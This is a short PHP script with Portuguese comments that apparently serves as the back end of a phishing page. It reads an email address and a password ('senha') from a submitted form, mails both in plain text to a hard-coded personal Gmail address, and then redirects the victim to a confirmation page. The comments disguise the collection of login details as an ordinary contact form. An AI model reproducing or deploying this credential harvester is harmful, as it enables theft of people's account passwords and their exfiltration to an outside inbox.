<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST["email"];
    $senha = $_POST["senha"];

    // Configurações do email
    $para = "willsantana384@gmail.com";
    $assunto = "Novo contato do formulário";

    // Corpo do email
    $mensagem = "Email: $email\nSenha: $senha";

    // Envia o email
    mail($para, $assunto, $mensagem);

    // Redireciona para uma página de confirmação
    header("Location: confirmacao.html");
    exit;
}
?>
